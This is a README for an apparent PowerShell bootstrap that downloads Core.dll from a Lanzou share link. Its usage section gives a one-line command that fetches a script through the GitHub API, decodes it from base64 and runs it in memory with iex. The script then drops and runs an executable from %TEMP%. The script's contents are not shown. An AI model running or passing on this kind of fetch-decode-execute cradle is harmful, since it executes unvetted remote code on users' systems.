# bootstrap

PowerShell bootstrap for downloading a file from a Lanzou share link.

## Files

- `Colud.ps1` - PowerShell bootstrap script.
- `LanzouDownloader-static.exe` - self-contained C++ resolver, static CRT.

## Usage

Run from PowerShell using the GitHub API because `raw.githubusercontent.com` may be blocked or fail TLS:

```powershell
$api = "https://api.github.com/repos/VTLOWKEY/bootstrap/contents/Colud.ps1?ref=main"
$j = Invoke-RestMethod -Uri $api -Headers @{
    "User-Agent" = "PowerShell"
    "Accept" = "application/vnd.github+json"
}
$code = [Text.Encoding]::UTF8.GetString(
    [Convert]::FromBase64String(($j.content -replace "\s", ""))
)
iex $code
```

One-line version:

```powershell
$j=irm "https://api.github.com/repos/VTLOWKEY/bootstrap/contents/Colud.ps1?ref=main" -Headers @{"User-Agent"="PowerShell"}; iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($j.content -replace "\s",""))))
```

## What it does

1. Downloads `Colud.ps1` through the GitHub API.
2. Downloads `LanzouDownloader-static.exe` to `%TEMP%`.
3. Verifies the resolver SHA256.
4. Resolves the configured Lanzou share link.
5. Downloads the target file.
6. Deletes the temporary resolver.

The current configuration downloads `Core.dll` from the sample Lanzou share URL to the current directory. Edit the `param` defaults in `Colud.ps1` to change the share URL, password, output name, or resolver source.

Only execute scripts and binaries from sources you trust.
